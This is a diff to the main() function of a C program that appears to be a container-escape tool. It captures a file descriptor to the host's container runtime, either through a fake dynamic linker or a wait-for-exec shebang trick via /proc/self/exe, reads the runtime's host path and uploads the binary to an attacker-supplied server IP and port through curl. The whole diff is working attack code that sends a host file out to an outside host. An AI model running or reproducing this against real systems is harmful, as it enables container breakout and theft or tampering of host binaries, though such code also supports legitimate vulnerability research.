@@ -108,8 +108,8 @@ int main(int argc, char const *argv[])
 {
     int sockfd, runtime_fd = -1;
     struct stat file_info;
-    char rt_hostpath_buf[SMALL_BUF_SIZE], link_buf[SMALL_BUF_SIZE];  
-    char * rt_hostpath, *ctr_link_to_rt;
+    char rt_hostpath_buf[SMALL_BUF_SIZE], ctr_link_to_rt_buf[SMALL_BUF_SIZE];  
+    char * rt_hostpath;
     int rc;
 
     /* Default configuration */
@@ -124,16 +124,16 @@ int main(int argc, char const *argv[])
     if (parse_arguments(&conf, argc, argv) != 0)
         return 1;
 
-    /* Get a file descriptor for the container runtime, and a link to the runtime's path on the host */
+    /* Get a file descriptor for the host's container runtime */
     if (!conf.wait_for_exec)
     {
-        // Running as the dynamic linker of the runtime process, so the runtime should be accessible at /proc/self/exe
-        ctr_link_to_rt = "/proc/self/exe";  
-        runtime_fd = open(ctr_link_to_rt, O_RDONLY); 
-        if (runtime_fd < 0)
+        /* Invoked by our fake dynamic linker, runtime should be accessible at the last open file descriptor */
+        runtime_fd = 3; 
+        while (1) // should be 3 (after std{io|out|err}), but let's make sure
         {
-            printf("[!] main: open(\"/proc/self/exe\") failed with '%s'\n", strerror(errno));
-            return 1;
+            if (fcntl(runtime_fd + 1, F_GETFD) == -1 && errno == EBADF)
+                break; // if next fd is invalid, the current is the runtime
+            runtime_fd++;
         }
 
         // Restore original dynamic linker to allow curl to work properly
@@ -145,7 +145,7 @@ int main(int argc, char const *argv[])
     }
     else
     {   
-        // Running as a normal process in the container, waiting for the runtime to exec in
+        /* Running as a normal process in the container, waiting for the runtime to exec in */
         printf("[+] Running in wait-for-exec mode; preparing '%s'\n", conf.exec_bin);
 
         // Create an executable at conf.exec_bin containing a shebang that points to the container runtime (#!/proc/self/exe)
@@ -159,21 +159,19 @@ int main(int argc, char const *argv[])
             runtime_fd = catch_rt_getdents_proc(conf.exec_bin);
         if (runtime_fd < 0)
             return 1;
+    }
 
-        // The runtime process may have already exited, so we'll try to read the runtime's path from the fd we opened for it
-        // Prepare /proc/self/fd/$runtime_fd
-        rc = snprintf(link_buf, SMALL_BUF_SIZE, "/proc/self/fd/%d", runtime_fd);
-        if (rc < 0) 
-        {
-            printf("[!] main: snprintf(link_buf) failed with '%s'\n", strerror(errno));
-            goto close_runtime_ret_1;
-        }
-        if (rc >= SMALL_BUF_SIZE)
-        {
-            printf("[!] main: snprintf(link_buf) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
-            goto close_runtime_ret_1;
-        }
-        ctr_link_to_rt = link_buf;
+    /* Prepare container link to runtime /proc/self/fd/<runtime_fd> */
+    rc = snprintf(ctr_link_to_rt_buf, SMALL_BUF_SIZE, "/proc/self/fd/%d", runtime_fd);
+    if (rc < 0) 
+    {
+        printf("[!] main: snprintf(ctr_link_to_rt_buf) failed with '%s'\n", strerror(errno));
+        goto close_runtime_ret_1;
+    }
+    if (rc >= SMALL_BUF_SIZE)
+    {
+        printf("[!] main: snprintf(ctr_link_to_rt_buf) failed, not enough space in buffer (required:%d, bufsize:%d)", rc, SMALL_BUF_SIZE);
+        goto close_runtime_ret_1;
     }
 
     /* Get container runtime size */
@@ -182,11 +180,12 @@ int main(int argc, char const *argv[])
         printf("[!] upload_file: fstat(fp) failed with '%s'\n", strerror(errno));
         goto close_runtime_ret_1;
     }
+
     /* Try to get the runtime's path on the host */
-    rc = readlink(ctr_link_to_rt, rt_hostpath_buf, SMALL_BUF_SIZE);
+    rc = readlink(ctr_link_to_rt_buf, rt_hostpath_buf, SMALL_BUF_SIZE);
     if (rc < 0)
     {
-        printf("[!] main: readlink(ctr_link_to_rt) failed with '%s', continuing without the runtime's path\n", strerror(errno));
+        printf("[!] main: readlink(ctr_link_to_rt_buf) failed with '%s', continuing without the runtime's path\n", strerror(errno));
         rt_hostpath = NULL;
     }
     else
@@ -197,8 +196,8 @@ int main(int argc, char const *argv[])
 
     /* Upload runtime to server */
     printf("[+] Uploading...\n");
-    // No hurry to send the runtime, even in wait-for-exec mode,
-    // as we opened a file descriptor pointing to it. Defer to curl
+    // No hurry to send the runtime since we have a file descriptor pointing to it.
+    // Defer to curl
     if (sendfile_curl(conf.server_ip, conf.port, runtime_fd, rt_hostpath) < 0)
         goto close_runtime_ret_1;
 
